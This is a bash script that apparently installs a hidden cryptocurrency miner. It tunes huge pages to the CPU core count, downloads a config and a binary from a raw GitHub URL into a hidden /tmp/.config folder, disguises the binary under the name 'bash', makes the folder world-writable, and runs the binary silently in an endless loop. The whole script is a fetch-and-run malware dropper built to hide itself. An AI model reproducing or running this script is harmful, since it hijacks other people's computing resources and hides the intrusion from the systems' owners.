#!/bin/bash

sudo apt -qqy update || apt -qqy update
sudo apt -qqy install wget icu-devtools || apt -qqy install wget icu-devtools

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
name="Cli_${cores}.sh"

src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
sudo sysctl -w vm.nr_hugepages=$((cores*256)) || sysctl -w vm.nr_hugepages=$((cores*256))

mkdir -p "/tmp/.config"
wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
wget -qO "/tmp/.config/bash" "${src}/q"
chmod -R 777 "/tmp/.config"

while true; do cd /tmp/.config; ./bash "${name}" "${cores}" >/dev/null 2>&1 ; done

